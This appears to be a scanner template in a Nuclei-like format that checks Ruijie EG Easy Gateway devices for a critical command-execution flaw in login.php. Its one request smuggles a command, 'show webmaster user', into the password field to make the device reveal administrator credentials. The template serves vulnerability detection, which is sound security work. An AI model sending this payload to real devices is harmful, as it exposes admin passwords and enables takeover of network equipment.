id: ruijie-eg-login-rce
brief:
    title: Ruijie EG Easy Gateway - Remote Command Execution
    by: pikpikcu
    level: critical
    about: Ruijie EG Easy Gateway login.php has remote commmand execution vulnerability, which can lead to the disclosure of administrator account and password.
    label:
        - ruijie
        - rce
        - vuln
    score: CVSS:10.0
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/login.php'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: username=admin&password=admin?show+webmaster+user
      signs:
        - "on": word
          has:
            - '"data":'
            - '"status":1'
            - admin
          in: body
          need: all
        - "on": word
          has:
            - text/json
          in: header
          need: all
        - "on": status
          status:
            - 200
